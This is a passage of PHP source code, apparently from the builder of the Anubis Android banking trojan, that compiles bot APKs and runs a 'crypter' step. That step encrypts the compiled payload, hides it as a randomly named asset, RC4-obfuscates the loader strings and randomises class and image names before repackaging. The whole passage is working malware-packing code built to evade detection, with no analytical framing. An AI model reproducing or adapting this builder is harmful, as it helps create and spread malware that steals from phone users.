			{ //rename res in .java
				$this->replaceTextFile($value, ".$defaultResFile)", ".$newResFile)");
				$this->replaceTextFile($value, "/$defaultResFile)", "/$newResFile)");

				$valueCrypt = str_replace("anubisSource", "anubisCrypt", $value);

				$this->replaceTextFile($valueCrypt, ".$defaultResFile)", ".$newResFile)");
				$this->replaceTextFile($valueCrypt, "/$defaultResFile)", "/$newResFile)");
			}
		}

		//----Build--------
		if($debug)
			system("cd tmp/build/anubisSource && ./gradlew assembleDebug");
		else
			system("cd tmp/build/anubisSource && ./gradlew assembleRelease");

		$date = date('d-m-Y_H-i-s');

		if($crypt == true)
		{ //----Crypter----

			if($debug)
				system("cp tmp/build/anubisSource/app/build/outputs/apk/debug/app-debug.apk $rootDir/tmp/dex.apk");
			else
				system("cp tmp/build/anubisSource/app/build/outputs/apk/release/app-release.apk $rootDir/tmp/dex.apk");

			$pathBuildGradle = "tmp/build/anubisCrypt/app/build.gradle";

			$this->replaceTextFile($pathBuildGradle, "=SERT=", $rootDir."/tmp/build/sert");

			//    include "../../config.php";
			//  include "../../crypt.php";
			$pathMainCodeCrypt = "tmp/build/anubisCrypt/app/src/main/";

			$nameDex = $this->randString() . ""; //.apk
			$keyCrypt = $this->randString();
			$fileDex = "tmp/dex.apk";
			$imagedata = file_get_contents("$fileDex");
			$encText = encrypt($imagedata, $keyCrypt);

			$ifp = fopen("tmp/build/anubisCrypt/app/src/main/assets/$nameDex", "wb");
			fwrite($ifp, $encText);
			fclose($ifp);

			$keyEn2 = $this->randString();
			$textEn2 = encryptText($nameDex, $keyEn2);
			$nameDex = "strDecRC4(\"$textEn2\", \"$keyEn2\")"; //replace Text

			$this->replaceTextFile($pathMainCodeCrypt . "java/" . $arrayRandPackageCrypt[0] . "/" . $arrayRandPackageCrypt[1] . "/" . $arrayRandPackageCrypt[2] . "/Protector.java", "\"-=nameDexFile=-\"", "$nameDex");
			$this->replaceTextFile($pathMainCodeCrypt . "java/" . $arrayRandPackageCrypt[0] . "/" . $arrayRandPackageCrypt[1] . "/" . $arrayRandPackageCrypt[2] . "/Protector.java", "-=DecryptFileKey=-", "$keyCrypt");

			$SRC_APP_CLASS_NAME = $this->randString();

			$this->replaceTextFile($pathMainCodeCrypt . "/AndroidManifest.xml", "SRC_APP_CLASS_NAME", "$SRC_APP_CLASS_NAME"); //Crypt
			$this->replaceTextFile($pathMainCodeCrypt . "java/" . $arrayRandPackageCrypt[0] . "/" . $arrayRandPackageCrypt[1] . "/" . $arrayRandPackageCrypt[2] . "/Protector.java", "SRC_APP_CLASS_NAME", "$SRC_APP_CLASS_NAME");
			$this->replaceTextFile($pathMainCodeCrypt . "java/" . $arrayRandPackageCrypt[0] . "/" . $arrayRandPackageCrypt[1] . "/" . $arrayRandPackageCrypt[2] . "/Protector.java", "anubis.bot.myapplication.MainApplication", "$newPackage.$nameMainApplication");

			//Rename drawable .png
			$imFile = $this->randString();
			$qqFile = $this->randString();
			rename($pathMainCodeCrypt . "res/drawable/im.png", $pathMainCodeCrypt . "res/drawable/$imFile.png");
			rename($pathMainCodeCrypt . "res/drawable/qq.jpg", $pathMainCodeCrypt . "res/drawable/$qqFile.jpg");

			$this->replaceTextFile($pathMainCodeCrypt . "/AndroidManifest.xml", "@drawable/im", "@drawable/$imFile"); //Crypt

			//Rename name all class Crypt
			//~ $varPathCrypt = 0;
			//~ foreach($arrayAllJavaFileCrypt as $key => $pathFile)
			//~ {
				//~ $info = pathinfo($pathFile);
				//~ if(strlen($info['filename']) > 0)
				//~ {

					//~ //if($info['filename']!="Protector"){
					//~ $defaultNameFileCrypt = $info['filename'];

					//~ $newNameFileCrypt = $this->randString();

					//~ $newPathCrypt = str_replace("/$defaultNameFileCrypt.java", "/$newNameFileCrypt.java", $pathFile); //replace Text

					//~ rename($pathFile, $newPathCrypt);

					//~ $arrayAllJavaFileCrypt[$varPathCrypt] = $newPathCrypt;
					//~ $varPathCrypt++;

					//~ $this->replaceTextFile($pathMainCodeCrypt . "/AndroidManifest.xml", ".$defaultNameFileCrypt", ".$newNameFileCrypt"); // rename class manifest
					//~ foreach($arrayAllJavaFileCrypt as $key2 => $pathFile2)
					//~ {

						//~ $this->replaceTextFile($pathFile2, $defaultNameFileCrypt, $newNameFileCrypt);

						//~ foreach($this->getFiles($pathResCrypt) as $key => $file)
						//~ { // resources replace name class
							//~ $this->replaceTextFile($file, ".$defaultNameFileCrypt\"", ".$newNameFileCrypt\"");
						//~ }

					//~ }
				//~ }
			//~ }

			if($debug)
				system("cd tmp/build/anubisCrypt && ./gradlew assembleDebug"); //build
			else
				system("cd tmp/build/anubisCrypt && ./gradlew assembleRelease"); //build
			
			system("chmod -R 777 tmp/build");

			if(!file_exists("tmp/build/anubisCrypt/app/build/outputs/apk/debug/app-debug.apk") &&
			!file_exists("tmp/build/anubisCrypt/app/build/outputs/apk/release/app-release.apk"))
			{
				if($task_filename != "" && file_exists($task_filename))
				{
					$task = json_decode(file_get_contents($task_filename), true);
					$task["status"] = "Error";
					file_put_contents($task_filename, json_encode($task));
					exit(0);
				}
			}

			if($debug)
			{
				system("cp tmp/build/anubisCrypt/app/build/outputs/apk/debug/app-debug.apk $rootDir/tasks/$date\_$tag.apk");
			}else{
				system("cp tmp/build/anubisCrypt/app/build/outputs/apk/release/app-release.apk $rootDir/tasks/$date\_$tag.apk");
			}
			
			if($task_filename != "" && file_exists($task_filename))
			{
				unlink($task_filename);
			}
			
		
		// build without crypt
		}else{
			
			if(!file_exists("tmp/build/anubisSource/app/build/outputs/apk/debug/app-debug.apk") &&
			!file_exists("tmp/build/anubisSource/app/build/outputs/apk/release/app-release.apk"))
			{
				if($task_filename != "" && file_exists($task_filename))
				{
					$task = json_decode(file_get_contents($task_filename), true);
					$task["status"] = "Error";
					file_put_contents($task_filename, json_encode($task));
					exit(0);
				}
			}
		
			if($debug)
			{
				system("cp tmp/build/anubisSource/app/build/outputs/apk/debug/app-debug.apk $rootDir/tasks/$date\_$tag.apk");
			}else{
				system("cp tmp/build/anubisSource/app/build/outputs/apk/release/app-release.apk $rootDir/tasks/$date\_$tag.apk");
			}
			
			if($task_filename != "" && file_exists($task_filename))
			{
				unlink($task_filename);
			}
			
		}

	}


}

